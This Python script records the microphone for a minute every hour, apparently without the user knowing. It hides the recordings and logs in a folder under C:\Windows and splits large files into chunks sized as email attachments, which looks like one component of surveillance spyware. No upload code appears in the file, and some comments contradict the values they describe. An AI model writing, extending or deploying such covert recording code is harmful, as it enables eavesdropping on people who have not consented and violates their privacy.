import logging
import os
import sounddevice as sd
import wave
import math
import threading

# Shared settings
output_directory = "C:\\Windows\\klm\\output"
log_directory = "C:\\Windows\\klm\\logs"
logging.basicConfig(filename=os.path.join(log_directory, 'file_generation.log'), level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
MICROPHONE_DURATION = 60  # 30 seconds for testing, adjust as needed
MAX_ATTACHMENT_SIZE = 5 * 1024 * 1024  # 7 MB
lock_path = os.path.join(log_directory, "audio_record.lock")

def acquire_lock():
    """ Acquire an exclusive lock file to prevent multiple instances. """
    if os.path.exists(lock_path):
        logging.error("Another instance is running.")
        return False
    with open(lock_path, 'w') as lock_file:
        lock_file.write("locked")
    return True

def release_lock():
    """ Release the exclusive lock. """
    os.remove(lock_path)

def record_audio():
    try:
        fs = 44100  # Sample rate
        seconds = MICROPHONE_DURATION  # Duration of recording
        audio_path = os.path.join(output_directory, "audio_log.wav")

        logging.info("Starting audio recording...")
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='int16')
        sd.wait()  # Wait until recording is finished
        logging.info("Audio recording complete.")

        # Save as WAV file
        with wave.open(audio_path, 'wb') as wf:
            wf.setnchannels(2)
            wf.setsampwidth(2)  # 2 bytes per sample
            wf.setframerate(fs)
            wf.writeframes(myrecording.tobytes())

        audio_size = os.path.getsize(audio_path)
        logging.info(f"Recorded audio size: {audio_size} bytes")
        if audio_size > MAX_ATTACHMENT_SIZE:
            logging.info("Splitting audio file due to size")
            split_audio_file(audio_path)
        else:
            logging.info(f"Audio file saved to {audio_path}")
    except Exception as e:
        logging.error(f"Failed to record audio: {e}")
    finally:
        release_lock()

def split_audio_file(audio_path):
    chunk_size = MAX_ATTACHMENT_SIZE - 1024 * 1024  # 6 MB
    with wave.open(audio_path, 'rb') as wf:
        params = wf.getparams()
        total_frames = wf.getnframes()
        frames_per_chunk = chunk_size // (params.sampwidth * params.nchannels)
        num_chunks = math.ceil(total_frames / frames_per_chunk)

        for i in range(num_chunks):
            chunk_path = os.path.join(output_directory, f"audio_log_part_{i+1}.wav")
            with wave.open(chunk_path, 'wb') as chunk_wf:
                chunk_wf.setparams(params)
                frames = wf.readframes(frames_per_chunk)
                chunk_wf.writeframes(frames)
            logging.info(f"Created audio chunk: {chunk_path} with size: {os.path.getsize(chunk_path)} bytes")
    os.remove(audio_path)  # Delete the original file after splitting

def schedule_recording():
    if acquire_lock():  # Only proceed if the lock was successfully acquired
        record_audio()
    threading.Timer(3600, schedule_recording).start()  # Schedule next recording in 1 hour

if __name__ == "__main__":
    schedule_recording()
